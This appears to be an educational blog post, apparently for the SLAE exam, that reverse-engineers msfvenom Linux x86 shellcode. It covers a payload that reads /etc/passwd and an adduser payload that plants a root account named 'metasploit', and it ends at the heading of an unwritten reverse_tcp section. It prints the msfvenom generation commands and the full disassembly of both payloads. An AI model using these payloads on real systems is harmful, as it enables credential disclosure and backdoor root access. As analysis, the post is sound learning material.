
# Analysing shellcode generated by msfvenom

In this article, I will analyse three shellcode samples generated by msfvenom, specifically:

- linux/x86/read_file
- linux/x86/adduser
- linux/x86/shell/reverse_tcp

```
msfvenom --list payloads -a x86 --platform linux
```

Let's see if there is something new we can learn from these samples :)


## Analysing linux/x86/read_file

First, we generate the executable like so:

```
msfvenom -p linux/x86/read_file -a x86 --platform linux PATH=/etc/passwd FD=2 -f elf -o read_file
```

I set the payload options `PATH` and `FD` to `/etc/passwd` and `2`. Executing the program outputs the contents of `/etc/passwd`.

```
dubs3c@slae:~/SLAE/EXAM/github/assignment_5$ ./read_file
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
...
```

Now that we know that the payload works, we can start analyzing it using a few simple tools.

With `ndisasm` we can disassemble the binary and analyse the assembly code.

```
dubs3c@slae:~/SLAE/EXAM/github/assignment_5$ msfvenom -p linux/x86/read_file -a x86 --platform linux PATH=/etc/passwd FD=2 -f raw | ndisasm -u -
No encoder specified, outputting raw payload
Payload size: 73 bytes

00000000  EB36              jmp short 0x38
00000002  B805000000        mov eax,0x5
00000007  5B                pop ebx
00000008  31C9              xor ecx,ecx
0000000A  CD80              int 0x80
0000000C  89C3              mov ebx,eax
0000000E  B803000000        mov eax,0x3
00000013  89E7              mov edi,esp
00000015  89F9              mov ecx,edi
00000017  BA00100000        mov edx,0x1000
0000001C  CD80              int 0x80
0000001E  89C2              mov edx,eax
00000020  B804000000        mov eax,0x4
00000025  BB02000000        mov ebx,0x2
0000002A  CD80              int 0x80
0000002C  B801000000        mov eax,0x1
00000031  BB00000000        mov ebx,0x0
00000036  CD80              int 0x80
00000038  E8C5FFFFFF        call dword 0x2
0000003D  2F                das
0000003E  657463            gs jz 0xa4
00000041  2F                das
00000042  7061              jo 0xa5
00000044  7373              jnc 0xb9
00000046  7764              ja 0xac
00000048  00                db 0x00
```

Looking at the assembly output we can immedietly recognise kernel interrupt instructions *(int x80)*, meaning the program is making use of syscalls. The specific syscall being called is often defined in `eax` and any arguments are placed in `ebx, ecx, edx`.

The first instruction is a jump to `0x38`, following the jump to address `00000038` we see that the next instruction is `call dword 0x2`. A `call` instruction will push the address of the next instruction to the stack. The call takes us back to the beginning of the shellcode, next instruction is `mov eax, 0x5` at address `00000002`. Placing `0x5` in `eax` specifies which syscall to execute. Checking in `usr/include/i386-linux-gnu/asm/unistd_32.h` which syscall corresponds to `0x5` returned:

```
#define __NR_restart_syscall 0
#define __NR_exit 1
#define __NR_fork 2
#define __NR_read 3
#define __NR_write 4
#define __NR_open 5
#define __NR_close 6
#define __NR_waitpid 7
#define __NR_creat 8
#define __NR_link 9
#define __NR_unlink 10
...
```

The syscall is `__NR_open 5`. Running `man 2 open` reveals the following syntax for open:

```
[...]
int open(const char *pathname, int flags);
int open(const char *pathname, int flags, mode_t mode);
[..]
```

The first argument is the filepath, next two arguments are flags and which mode that should be used. The `pop ebx` instruction pops the address on top of the stack into the `ebx` register. Now what does this address point to? Well, let's check what the hex values after the call instruction converts to:

```
2F 657463 2F 7061 7373 7764 00 = /etc/passwd\0
```

The file that we want to open :)

```
00000002  B805000000        mov eax,0x5
00000007  5B                pop ebx
00000008  31C9              xor ecx,ecx
0000000A  CD80              int 0x80
```

The next argument is 0 because `xor ecx, ecx` returns zero. Finally the syscall is executed and the result is stored in `eax`, which is a file descriptor.


Next section actually reads the contents of the file. This is done by moving the previous result (the file descriptor) into `ebx` which is the first argument for the READ syscall. `0x3` is placed into `eax` and corresponds to the READ syscall. `ecx` contains the address where the contents will be stored, while `edx` indicates how many bytes to read, which is this case is 4096 (0x1000). `READ` will return the number of bytes read into `eax`.

```
0000000C  89C3              mov ebx,eax
0000000E  B803000000        mov eax,0x3
00000013  89E7              mov edi,esp
00000015  89F9              mov ecx,edi
00000017  BA00100000        mov edx,0x1000
0000001C  CD80              int 0x80
```

The final section writes the contents to `STDOUT` and then exits the program. The first four instructions sets up the WRITE syscall by placing `0x4` into `eax`, setting the first argument to `0x2` which is STDOUT and finally sets how many bytes to write in `edx`. The following three instructions simply exits the program by setting `eax` to the EXIT syscall.

```
0000001E  89C2              mov edx,eax
00000020  B804000000        mov eax,0x4
00000025  BB02000000        mov ebx,0x2
0000002A  CD80              int 0x80
0000002C  B801000000        mov eax,0x1
00000031  BB00000000        mov ebx,0x0
00000036  CD80              int 0x80
```

You can also inspect the binary by running it with `strace`, which shows you all the functions invocations and values:

```
dubs3c@slae:~/SLAE/EXAM/github/assignment_5$ strace ./read_file
execve("./read_file", ["./read_file"], [/* 22 vars */]) = 0
open("/etc/passwd", O_RDONLY)           = 3
read(3, "root:x:0:0:root:/root:/bin/bash\n"..., 4096) = 1888
write(2, "root:x:0:0:root:/root:/bin/bash\n"..., 1888root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
[...]
```

Now we have finished analysing the first shellcode created by msfvenom, let's move on to the next one!

## linux/x86/adduser

Next payload generated by `msfvenom` is the `adduser` shellcode. Let's start by examining the first five instructions.

```
00000000  31C9              xor ecx,ecx
00000002  89CB              mov ebx,ecx
00000004  6A46              push byte +0x46
00000006  58                pop eax
00000007  CD80              int 0x80
00000009  6A05              push byte +0x5
0000000B  58                pop eax
0000000C  31C9              xor ecx,ecx
0000000E  51                push ecx
0000000F  6873737764        push dword 0x64777373
00000014  682F2F7061        push dword 0x61702f2f
00000019  682F657463        push dword 0x6374652f
0000001E  89E3              mov ebx,esp
00000020  41                inc ecx
00000021  B504              mov ch,0x4
00000023  CD80              int 0x80
00000025  93                xchg eax,ebx
00000026  E828000000        call dword 0x53
0000002B  6D                insd
0000002C  657461            gs jz 0x90
0000002F  7370              jnc 0xa1
00000031  6C                insb
00000032  6F                outsd
00000033  69743A417A2F6449  imul esi,[edx+edi+0x41],dword 0x49642f7a
0000003B  736A              jnc 0xa7
0000003D  3470              xor al,0x70
0000003F  3449              xor al,0x49
00000041  52                push edx
00000042  633A              arpl [edx],di
00000044  303A              xor [edx],bh
00000046  303A              xor [edx],bh
00000048  3A2F              cmp ch,[edi]
0000004A  3A2F              cmp ch,[edi]
0000004C  62696E            bound ebp,[ecx+0x6e]
0000004F  2F                das
00000050  7368              jnc 0xba
00000052  0A598B            or bl,[ecx-0x75]
00000055  51                push ecx
00000056  FC                cld
00000057  6A04              push byte +0x4
00000059  58                pop eax
0000005A  CD80              int 0x80
0000005C  6A01              push byte +0x1
0000005E  58                pop eax
0000005F  CD80              int 0x80
```

We can see that the last instruction is a kernel interrupt instruction, indicating that a syscall is going be made. The syscall number is placed in `eax`. The value is 0x46 which first pushed onto the stack, which is immidietly poped into `eax`. By looking in `/usr/include/i386-linux-gnu/asm/unistd_32.h` we can see which syscall corresponds to `46`.

```
00000000  31C9              xor ecx,ecx
00000002  89CB              mov ebx,ecx
00000004  6A46              push byte +0x46
00000006  58                pop eax
00000007  CD80              int 0x80
```

As we can see below, it's `setgid()`. 

```
#define __NR_prof 44
#define __NR_brk 45
#define __NR_setgid 46
#define __NR_getgid 47
#define __NR_signal 48
```

Running `man 2 setgid` tells us the syntax of the function and its description. The function only has one argument which is set to zero which we can see in the first two instructions.

```
[...]
SYNOPSIS
       #include <sys/types.h>
       #include <unistd.h>

       int setgid(gid_t gid);

DESCRIPTION
       setgid() sets the effective group ID of the calling process.  If the caller is the superuser, the real GID and saved set-group-ID are also set.
[...]
```

The next section has a little more going on, we can see that there are twelve bytes being pushed onto the stack. Decoding `2f6574632f2f706173737764` reveals `/etc//passwd`. The first instruction also pushes `0x5` onto the stack, which is again immediately poped into `eax`. We know from the previous shellcode that is value corresponds to the syscall `OPEN`. Now it's clear that this section opens the file `/etc/passwd` and returns a file descriptor, as seen in the previous payload.


```
00000009  6A05              push byte +0x5
0000000B  58                pop eax
0000000C  31C9              xor ecx,ecx
0000000E  51                push ecx
0000000F  6873737764        push dword 0x64777373
00000014  682F2F7061        push dword 0x61702f2f
00000019  682F657463        push dword 0x6374652f
0000001E  89E3              mov ebx,esp
00000020  41                inc ecx
00000021  B504              mov ch,0x4
00000023  CD80              int 0x80
```

Now comes the juciy part, modifying `/etc/passwd`. Everything after address `00000026` looks like gibberish, and the fact that there is a `call` instruction makes be believe that this is a call-pop technique that we have seen in the previous example. For this last part, I will use GDB to analyse how the program adds a new user to the system.

```
00000025  93                xchg eax,ebx        ; change the value in eax to ebx and vice verca. ebx now contains the FD
00000026  E828000000        call dword 0x53
0000002B  6D                insd
0000002C  657461            gs jz 0x90
0000002F  7370              jnc 0xa1
00000031  6C                insb
00000032  6F                outsd
00000033  69743A417A2F6449  imul esi,[edx+edi+0x41],dword 0x49642f7a
0000003B  736A              jnc 0xa7
0000003D  3470              xor al,0x70
0000003F  3449              xor al,0x49
00000041  52                push edx
00000042  633A              arpl [edx],di
00000044  303A              xor [edx],bh
00000046  303A              xor [edx],bh
00000048  3A2F              cmp ch,[edi]
0000004A  3A2F              cmp ch,[edi]
0000004C  62696E            bound ebp,[ecx+0x6e]
0000004F  2F                das
00000050  7368              jnc 0xba
00000052  0A598B            or bl,[ecx-0x75]
00000055  51                push ecx
00000056  FC                cld
00000057  6A04              push byte +0x4
00000059  58                pop eax
0000005A  CD80              int 0x80
```

The binary is stripped from any debug symbols, but we can use `readelf` to get the entrypoint of the program. With this information we can debug the program.

```
dubs3c@slae:~/SLAE/EXAM/github/assignment_5$ readelf -h add_user
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF32
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Intel 80386
  Version:                           0x1
  Entry point address:               0x8048054
  Start of program headers:          52 (bytes into file)
  Start of section headers:          0 (bytes into file)
  Flags:                             0x0
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         1
  Size of section headers:           0 (bytes)
  Number of section headers:         0
  Section header string table index: 0
```

Loading the binary with GDB and setting necessary breakpoints gives shows us the disassembled binary.

```
dubs3c@slae:~/SLAE/EXAM/github/assignment_5$ gdb -q add_user
Reading symbols from /home/dubs3c/SLAE/EXAM/github/assignment_5/add_user...(no debugging symbols found)...done.
(gdb) b *0x8048054
Breakpoint 1 at 0x8048054
(gdb) r
Starting program: /home/dubs3c/SLAE/EXAM/github/assignment_5/add_user

Breakpoint 1, 0x08048054 in ?? ()
(gdb) disas 0x8048054, 0x8048054+97
Dump of assembler code from 0x8048054 to 0x80480b5:
=> 0x08048054:  xor    ecx,ecx
   0x08048056:  mov    ebx,ecx
   0x08048058:  push   0x46
   0x0804805a:  pop    eax
   0x0804805b:  int    0x80
   0x0804805d:  push   0x5
   0x0804805f:  pop    eax
   0x08048060:  xor    ecx,ecx
   0x08048062:  push   ecx
   0x08048063:  push   0x64777373
   0x08048068:  push   0x61702f2f
   0x0804806d:  push   0x6374652f
   0x08048072:  mov    ebx,esp
   0x08048074:  inc    ecx
   0x08048075:  mov    ch,0x4
   0x08048077:  int    0x80
   0x08048079:  xchg   ebx,eax
   0x0804807a:  call   0x80480a7
   0x0804807f:  ins    DWORD PTR es:[edi],dx
   0x08048080:  gs
   0x08048081:  je     0x80480e4
   0x08048083:  jae    0x80480f5
   0x08048085:  ins    BYTE PTR es:[edi],dx
   0x08048086:  outs   dx,DWORD PTR ds:[esi]
   0x08048087:  imul   esi,DWORD PTR [edx+edi*1+0x41],0x49642f7a
   0x0804808f:  jae    0x80480fb
   0x08048091:  xor    al,0x70
   0x08048093:  xor    al,0x49
   0x08048095:  push   edx
   0x08048096:  arpl   WORD PTR [edx],di
   0x08048098:  xor    BYTE PTR [edx],bh
   0x0804809a:  xor    BYTE PTR [edx],bh
   0x0804809c:  cmp    ch,BYTE PTR [edi]
   0x0804809e:  cmp    ch,BYTE PTR [edi]
   0x080480a0:  bound  ebp,QWORD PTR [ecx+0x6e]
   0x080480a3:  das
   0x080480a4:  jae    0x804810e
   0x080480a6:  or     bl,BYTE PTR [ecx-0x75]
   0x080480a9:  push   ecx
---Type <return> to continue, or q <return> to quit---
   0x080480aa:  cld
   0x080480ab:  push   0x4
   0x080480ad:  pop    eax
   0x080480ae:  int    0x80
   0x080480b0:  push   0x1
   0x080480b2:  pop    eax
   0x080480b3:  int    0x80
End of assembler dump.
(gdb)
```

We are interested in the following instruction `0x0804807a:  call   0x80480a7`. Let's set a breakpoint and step to the next instruction to see where we land!

```
(gdb) b *0x0804807a
Breakpoint 2 at 0x804807a
(gdb) c
Continuing.

Breakpoint 2, 0x0804807a in ?? ()
(gdb) ni
0x080480a7 in ?? ()
(gdb) x/8i $pc                                                                                                                        => 0x80480a7:   pop    ecx
   0x80480a8:   mov    edx,DWORD PTR [ecx-0x4]
   0x80480ab:   push   0x4
   0x80480ad:   pop    eax      ; write() syscall
   0x80480ae:   int    0x80     ; execute syscall
   0x80480b0:   push   0x1
   0x80480b2:   pop    eax      ; exit() syscall
   0x80480b3:   int    0x80     ; execute syscall, exit program
(gdb) ni
0x080480a8 in ?? ()
(gdb) x/s  $ecx
0x804807f:      "metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\nY\213Q\374j\004Xj\001X"
(gdb) x/x $ecx-4
0x804807b:      0x28
(gdb)
```

As can be seen in the above GDB output, the gibberish data was actually a string containing the new username and password. This string will be written to `/etc/passwd`. The string was popped into `ecx` because of the call instruction that pushed the address of the following instruction onto the stack. `edx` contains the amount of bytes to write, the instruction that computes this is at address `0x80480a8`. Completing the program inserts a new user called metasploit to the system:

```
dubs3c@slae:~/SLAE/EXAM/github/assignment_5$ grep metasploit /etc/passwd
metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh
```

Should be noted that the binary needs to be run as root, since it's adding a root user.

## linux/x86/shell/reverse_tcp
